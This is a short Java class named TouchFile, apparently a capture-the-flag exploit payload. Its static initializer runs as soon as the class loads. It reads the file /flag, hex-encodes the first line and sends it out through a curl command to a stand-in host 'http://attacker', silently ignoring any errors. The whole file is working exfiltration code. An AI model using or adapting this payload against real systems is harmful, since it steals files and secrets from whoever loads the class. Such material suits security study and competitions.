import java.lang.Runtime;
import java.math.BigInteger;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.stream.Stream;
public class TouchFile {
    static {
        try {
            Stream<String> stream = Files.lines(Paths.get("/flag"));
            String flag = stream.findFirst().get();
            String hex = String.format("%x", new BigInteger(1, flag.getBytes()));
            Runtime.getRuntime().exec("curl http://attacker/?flag=" + hex);
        } catch (Exception ignore) {}
    }
}